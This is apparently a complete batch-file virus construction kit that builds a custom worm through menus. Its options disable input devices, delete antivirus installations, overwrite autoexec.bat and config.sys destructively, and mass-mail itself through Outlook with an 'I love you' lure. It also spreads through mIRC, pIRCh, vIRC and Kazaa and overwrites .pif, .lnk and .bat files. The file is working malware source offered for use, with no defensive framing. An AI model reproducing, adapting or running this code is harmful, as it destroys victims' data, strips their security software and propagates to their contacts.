@echo e 02A0  70 67 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63>>nofbe
@echo e 02B0  6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75>>nofbe
@echo e 02C0  7E 31 5C 22 53 65 78 2C 20 4D 6F 6E 65 79 20 61>>nofbe
@echo e 02D0  6E 64 20 50 6F 77 65 72 2E 64 6F 63 2E 62 61 74>>nofbe
@echo e 02E0  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>nofbe
@echo e 02F0  20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C 22 57 61>>nofbe
@echo e 0300  72 63 72 61 66 74 20 33 20 75 70 64 61 74 65 2E>>nofbe
@echo e 0310  65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40>>nofbe
@echo e 0320  64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69>>nofbe
@echo e 0330  72 25 5C 64 65 73 6B 74 6F 70 5C 73 74 61 72 74>>nofbe
@echo e 0340  6D 7E 31 5C 2A 2E 2A 20 3E 6E 75 6C 0D 0A 40 63>>nofbe
@echo e 0350  6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C>>nofbe
@echo e 0360  64 65 73 6B 74 6F 70 5C 73 74 61 72 74 6D 7E 31>>nofbe
@echo e 0370  5C 22 57 69 6E 64 6F 77 73 20 55 70 64 61 74 65>>nofbe
@echo e 0380  2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A>>nofbe
@echo e 0390  00>>nofbe
@echo rcx>>nofbe
@echo 290>>nofbe
@echo n txt>>nofbe
@echo w>>nofbe
@echo q>>nofbe
@debug<nofbe
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y nofbe >nul
ctty con
cls
goto 001

:001
cls
echo.
echo.
echo.
echo        Mouse and keyboard payloads
echo.
echo.
echo.
echo    1 - Mouse and keyboard disable
echo.
echo    2 - Swap mouse buttons and keyboard disable
echo.
echo    3 - No mouse and keyboard payloads
echo.
echo    Q - e X i t
echo.
choice /c:123Q>nul
if errorlevel 4 goto done
if errorlevel 3 goto a7
if errorlevel 2 goto a6
if errorlevel 1 goto a5
echo CHOICE missing
goto done

:a5
cls
ctty nul
@echo.@%windir%\rundll32.exe mouse,disable>>ioana.txt
@echo.@%windir%\rundll32.exe keyboard,disable>>ioana.txt
ctty con
cls
goto 002

:a6
cls
ctty nul
@echo.@%windir%\rundll32.exe user,swapmousebutton>>ioana.txt
@echo.@%windir%\rundll32.exe keyboard,disable>>ioana.txt
ctty con
cls
goto 002

:a7
cls
ctty nul
@echo.:: no mouse and keyboard payloads>>ioana.txt
ctty con
cls
goto 002

:002
cls
echo.
echo.
echo.
echo        Retro for allmost 20 AV`z
echo.
echo.
echo.
echo    1 - Delete some AV`z
echo.
echo    2 - Leave the AV`z alone
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a9
if errorlevel 1 goto a8
echo CHOICE missing
goto done

:a8
cls
ctty nul
@echo"@deltree/y c:\progra~1\norton~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\norton~2\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\symant~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\symant~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\avpsha~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\mcafee\viruss~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\mcafee\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\pandas~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\trendm~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\comman~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\zonela~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\tinype~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\kasper~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\kasper~2\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\trojan~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\avpers~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\grisoft\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\antivi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\quickh~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\f-prot95\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\fwin32\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\tbav\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\esafen\ >nul">>ioana.txt
@echo"@deltree/y c:\f-macro\ >nul">>ioana.txt
@echo"@deltree/y c:\tbavw95\ >nul">>ioana.txt
@echo"@deltree/y c:\tbav\ >nul">>ioana.txt
@echo"@deltree/y c:\vs95\ >nul">>ioana.txt
@echo"@deltree/y c:\antivi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\toolkit\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\pccill~1\ >nul">>ioana.txt
ctty con
cls
goto 003

:a9
cls
ctty nul
@echo.:: no retro>>ioana.txt
ctty con
cls
goto 003

:003
cls
echo.
echo.
echo.
echo        Infect the c:\autoexec.bat file
echo.
echo.
echo.
echo    1 - autoexec.bat infection/droping
echo.
echo    2 - No autoexec.bat infection/droping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a11
if errorlevel 1 goto a10
echo CHOICE missing
goto done

:a10
cls
ctty nul
@echo"@echo.@time 00:00:00,00>c:\autoexec.bat">>ioana.txt
@echo"@echo.@date 80-01-01>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ษป ษป   ษป ษป>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         บบ บศป ษผบ บบ>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         บบ ศปศอผษผ บบ   Have you ever danced with the devil>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         บบ  บ   บ  บบ            in the moonlight ?>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         บบ  ศป ษผ  บบ>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ศผ   ศอผ   ศผ>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.subst e: a:\>>c:\autoexec.bat">>ioana.txt
@echo"@echo.subst d: a:\>>c:\autoexec.bat">>ioana.txt
@echo"@echo.cls>>c:\autoexec.bat">>ioana.txt
ctty con
cls
goto 004

:a11
cls
ctty nul
@echo.:: no autoexec.bat infection>>ioana.txt
ctty con
cls
goto 004

:004
cls
echo.
echo.
echo.
echo        Infect the c:\config.sys file
echo.
echo.
echo.
echo    1 - config.sys infection/droping
echo.
echo    2 - No config.sys infection/droping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a13
if errorlevel 1 goto a12
echo CHOICE missing
goto done

:a12
cls
ctty nul
@echo"@echo.@echo [menu]>c:\config.sys">>ioana.txt
@echo"@echo.@echo menuitem=DM>>c:\config.sys">>ioana.txt
@echo"@echo.@echo.>>c:\config.sys">>ioana.txt
@echo"@echo.@echo [DM]>>c:\config.sys">>ioana.txt
@echo"@echo.@echo buffers=1>>c:\config.sys">>ioana.txt
@echo"@echo.@echo files=1>>c:\config.sys">>ioana.txt
@echo"@echo.@echo lastdrive=A>>c:\config.sys">>ioana.txt
@echo"@echo.@echo set path=deltree/y c:\windows\inf\*.*>>c:\config.sys">>ioana.txt
@echo"@echo.@echo set temp=A:\DM>>c:\config.sys">>ioana.txt
@echo"@echo.@echo set msg=@echo Have you ever danced with the devil in the moonlight ?>>c:\config.sys">>ioana.txt
@echo"@echo.@echo.>>c:\config.sys">>ioana.txt
ctty con
cls
goto 005

:a13
cls
ctty nul
@echo.:: no config.sys infection>>ioana.txt
ctty con
cls
goto 005

:005
cls
echo.
echo.
echo.
echo        Outlook Express worm
echo.
echo.
echo.
echo    1 - Outlook Express spreading
echo.
echo    2 - No Outlook Express spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a15
if errorlevel 1 goto a14
echo CHOICE missing
goto done

:a14
cls
ctty nul
@echo"@echo.on error resume next>ioana.vbs">>ioana.txt
@echo"@echo.dim a,b,c,d,e>>ioana.vbs">>ioana.txt
@echo"@echo.set a = Wscript.CreateObject("Wscript.Shell")>>ioana.vbs">>ioana.txt
@echo"@echo.set b = CreateObject("Outlook.Application")>>ioana.vbs">>ioana.txt
@echo"@echo.set c = b.GetNameSpace("MAPI")>>ioana.vbs">>ioana.txt
@echo"@echo.for y = 1 To c.AddressLists.Count>>ioana.vbs">>ioana.txt
@echo"@echo.set d = c.AddressLists(y)>>ioana.vbs">>ioana.txt
@echo"@echo.x = 1>>ioana.vbs">>ioana.txt
@echo"@echo.set e = b.CreateItem(0)>>ioana.vbs">>ioana.txt
@echo"@echo.for o = 1 To d.AddressEntries.Count>>ioana.vbs">>ioana.txt
@echo"@echo.f = d.AddressEntries(x)>>ioana.vbs">>ioana.txt
@echo"@echo.e.Recipients.Add f>>ioana.vbs">>ioana.txt
@echo"@echo.x = x + 1>>ioana.vbs">>ioana.txt
@echo"@echo.next>>ioana.vbs">>ioana.txt
@echo"@echo.e.Subject = " For my special aNGeL ... IOANA ... ">>ioana.vbs">>ioana.txt
@echo"@echo.e.Body = " I love you ">>ioana.vbs">>ioana.txt
@echo"@echo.e.Attachments.Add ("c:\windows\system\ioana\ioana.bat")>>ioana.vbs">>ioana.txt
@echo"@echo.e.DeleteAfterSubmit = False>>ioana.vbs">>ioana.txt
@echo"@echo.e.Send>>ioana.vbs">>ioana.txt
@echo"@echo.f = "">>ioana.vbs">>ioana.txt
@echo"@echo.next>>ioana.vbs">>ioana.txt
@echo.@start ioana.vbs>>ioana.txt
ctty con
cls
goto 006

:a15
cls
ctty nul
@echo.:: no Outlook Express spreading>>ioana.txt
ctty con
cls
goto 006

:006
cls
echo.
echo.
echo.
echo        mirc worm
echo.
echo.
echo.
echo    1 - mIRC spreading
echo.
echo    2 - No mIRC spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a17
if errorlevel 1 goto a16
echo CHOICE missing
goto done

:a16
cls
ctty nul
@echo"@echo.[script]>script.ini">>ioana.txt
@echo"@echo.n0=on 1:JOIN:#:{>>script.ini">>ioana.txt
@echo"@echo.n1=/if ( $nick == $me ) { halt }>>script.ini">>ioana.txt
@echo"@echo.n2=/dcc send $nick c:\windows\system\ioana\ioana.bat>>script.ini">>ioana.txt
@echo"@echo.n3=}>>script.ini">>ioana.txt
@echo.@if exist c:\mirc\script.ini deltree/y c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\script.ini deltree/y c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\script.ini deltree/y c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\script.ini deltree/y c:\progra~1\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\mirc\mirc.ini copy script.ini c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\mirc.ini copy script.ini c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\mirc.ini copy script.ini c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\mirc.ini copy script.ini c:\progra~1\mirc32\script.ini>>ioana.txt
ctty con
cls
goto 007

:a17
cls
ctty nul
@echo.:: no mIRC spreading>>ioana.txt
ctty con
cls
goto 007

:007
cls
echo.
echo.
echo.
echo        pirch worm
echo.
echo.
echo.
echo    1 - pIRCh spreading
echo.
echo    2 - No pIRCh spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a19
if errorlevel 1 goto a18
echo CHOICE missing
goto done

:a18
cls
ctty nul
@echo"@echo.[Levels]>events.ini">>ioana.txt
@echo"@echo.Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Count=6>>events.ini">>ioana.txt
@echo"@echo.Level1=000-Unknowns>>events.ini">>ioana.txt
@echo"@echo.000-UnknownsEnabled=1>>events.ini">>ioana.txt
@echo"@echo.Level2=100-Level 100>>events.ini">>ioana.txt
@echo"@echo.100-Level 100Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level3=200-Level 200>>events.ini">>ioana.txt
@echo"@echo.200-Level 200Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level4=300-Level 300>>events.ini">>ioana.txt
@echo"@echo.300-Level 300Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level5=400-Level 400>>events.ini">>ioana.txt
@echo"@echo.400-Level 400Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level6=500-Level 500>>events.ini">>ioana.txt
@echo"@echo.500-Level 500Enabled=1>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[000-Unknowns]>>events.ini">>ioana.txt
@echo"@echo.User1=*!*@*>>events.ini">>ioana.txt
@echo"@echo.UserCount=1>>events.ini">>ioana.txt
@echo"@echo.Event1=ON JOIN:#:/dcc send $nick c:\windows\system\ioana\ioana.bat>>events.ini">>ioana.txt
@echo"@echo.EventCount=1>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[100-Level 100]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[200-Level 200]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[300-Level 300]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[400-Level 400]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[500-Level 500]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@deltree/y c:\pirch\events.ini >nul">>ioana.txt
@echo.@copy events.ini c:\pirch\events.ini>>ioana.txt
@echo"@deltree/y c:\pirch98\events.ini >nul">>ioana.txt
@echo.@copy events.ini c:\pirch98\events.ini>>ioana.txt
ctty con
cls
goto 008

:a19
cls
ctty nul
@echo.:: no pIRCh spreading>>ioana.txt
ctty con
cls
goto 008

:008
cls
echo.
echo.
echo.
echo        virc worm
echo.
echo.
echo.
echo    1 - vIRC spreading
echo.
echo    2 - No vIRC spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a21
if errorlevel 1 goto a20
echo CHOICE missing
goto done

:a20
cls
ctty nul
@echo"@echo.on error resume next>virc.vbs">>ioana.txt
@echo"@echo.set ws = CreateObject("wscript.shell")>>virc.vbs">>ioana.txt
@echo"@echo.ws.regwrite "HKEY_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17","dcc send $nick c:\windows\system\ioana\ioana.bat">>virc.vbs">>ioana.txt
@echo.@start virc.vbs>>ioana.txt
ctty con
cls
goto 009

:a21
cls
ctty nul
@echo.:: no vIRC spreading>>ioana.txt
ctty con
cls
goto 009

:009
cls
echo.
echo.
echo.
echo        Kazaa worm
echo.
echo.
echo.
echo    1 - Kazaa spreading
echo.
echo    2 - No Kazaa spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a23
if errorlevel 1 goto a22
echo CHOICE missing
goto done

:a22
cls
ctty nul
@echo"@echo.on error resume next>kaz.vbs">>ioana.txt
@echo"@echo.set ws = CreateObject("wscript.shell")>>kaz.vbs">>ioana.txt
@echo"@echo.ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","c:\windows\system\ioana\">>kaz.vbs">>ioana.txt
@echo.@start kaz.vbs>>ioana.txt
ctty con
cls
goto 010

:a23
cls
ctty nul
@echo.:: no Kazaa spreading>>ioana.txt
ctty con
cls
goto 010

:010
cls
echo.
echo.
echo.
echo        infect the .pif files
echo.
echo.
echo.
echo    1 - PIF dropping
echo.
echo    2 - No PIF dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a25
if errorlevel 1 goto a24
echo CHOICE missing
goto done

:a24
cls
ctty nul
@echo"@echo.on error resume next>pif.vbs">>ioana.txt
@echo"@echo.dim wshs, msc>>pif.vbs">>ioana.txt
@echo"@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>pif.vbs">>ioana.txt
@echo"@echo.set msc=wshs.CreateShortcut("C:\pif.lnk")>>pif.vbs">>ioana.txt
@echo"@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\ioana\ioana.bat")>>pif.vbs">>ioana.txt
@echo"@echo.msc.WindowStyle = 4>>pif.vbs">>ioana.txt
@echo"@echo.msc.Save>>pif.vbs">>ioana.txt
@echo.@start pif.vbs>>ioana.txt
@echo"@type nul | choice /n /cy /ty,7 >nul">>ioana.txt
@echo.@for %%a in (c:\*.pif *.pif ..\*.pif c:\mydocu~1\*.pif %windir%\*.pif %path%\*.pif %windir%\desktop\*.pif %windir%\system\*.pif) do copy c:\pif.pif %%a>>ioana.txt
ctty con
cls
goto 011

:a25
cls
ctty nul
@echo.:: no PIF dropping>>ioana.txt
ctty con
cls
goto 011

:011
cls
echo.
echo.
echo.
echo        infect the .lnk files
echo.
echo.
echo.
echo    1 - LNK dropping
echo.
echo    2 - No LNK dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a27
if errorlevel 1 goto a26
echo CHOICE missing
goto done

:a26
cls
ctty nul
@echo"@echo.on error resume next>lnk.vbs">>ioana.txt
@echo"@echo.dim wshs, msc>>lnk.vbs">>ioana.txt
@echo"@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>lnk.vbs">>ioana.txt
@echo"@echo.set msc=wshs.CreateShortcut("C:\lnk.lnk")>>lnk.vbs">>ioana.txt
@echo"@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\ioana\ioana.bat")>>lnk.vbs">>ioana.txt
@echo"@echo.msc.WindowStyle = 4>>lnk.vbs">>ioana.txt
@echo"@echo.msc.Save>>lnk.vbs">>ioana.txt
@echo.@start lnk.vbs>>ioana.txt
@echo"@type nul | choice /n /cy /ty,7 >nul">>ioana.txt
@echo.@for %%b in (c:\*.lnk *.lnk ..\*.lnk c:\mydocu~1\*.lnk %windir%\*.lnk %path%\*.lnk %windir%\desktop\*.lnk %windir%\system\*.lnk) do copy c:\lnk.lnk %%b>>ioana.txt
ctty con
cls
goto 012

:a27
cls
ctty nul
@echo.:: no LNK dropping>>ioana.txt
ctty con
cls
goto 012

:012
cls
echo.
echo.
echo.
echo        infect the .bat files
echo.
echo.
echo.
echo    1 - BAT dropping
echo.
echo    2 - No BAT dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a29
if errorlevel 1 goto a28
echo CHOICE missing
goto done

:a28
cls
ctty nul
@echo.@for %%c in (c:\*.bat *.bat ..\*.bat c:\mydocu~1\*.bat %windir%\*.bat %path%\*.bat %windir%\desktop\*.bat %windir%\system\*.bat) do copy %windir%\system\ioana\ioana.bat %%c>>ioana.txt
ctty con
cls
goto 013

:a29
cls
ctty nul
@echo.:: no BAT dropping>>ioana.txt
ctty con
cls
goto 013

:013
cls
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo        Your creation is now compiled in curent folder [ioana.txt]
@echo                     Rename ioana.txt to filename.bat              
@echo.
@echo                        Press any key to exit ...
@pause >nul
goto done

:XP
exit

:done
@echo.cls>>ioana.txt
cls